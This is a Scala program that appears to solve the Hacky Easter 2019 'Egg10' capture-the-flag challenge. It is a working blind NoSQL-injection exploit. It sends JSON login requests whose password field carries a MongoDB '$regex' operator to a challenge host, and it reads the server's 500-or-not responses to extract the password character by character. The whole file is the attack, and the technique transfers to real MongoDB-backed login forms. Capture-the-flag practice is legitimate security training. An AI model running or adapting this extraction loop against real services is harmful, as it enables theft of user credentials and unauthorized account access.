package hackyeaster2019

import org.apache.http.client.methods.HttpPost
import org.apache.http.entity.StringEntity
import org.apache.http.impl.client.HttpClients

object Egg10 extends App {

  val host = "http://whale.hacking-lab.com:3371"

  val http = HttpClients.createDefault()
  try {
    println(stealPassword())
  } finally {
    http.close()
  }

  def stealPassword(): String = {
    val alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

    def stealNextChar(prefix: String): Option[Char] =
      alphabet.find(c => test(s"""{ "$$regex": "^$prefix$c" }"""))

    def stealPassword(prefix: String): String = stealNextChar(prefix) match {
      case Some(c) => stealPassword(s"$prefix$c")
      case None => prefix
    }

    stealPassword("")
  }

  def test(expr: String): Boolean = {
    val payload = s"""{ "username": "null", "password": $expr }"""

    val request = new HttpPost(s"$host/login")
    request.setEntity(new StringEntity(payload))
    request.setHeader("Content-type", "application/json")

    val response = http.execute(request)
    try {
      response.getStatusLine.getStatusCode != 500
    } finally {
      response.close()
    }
  }

}
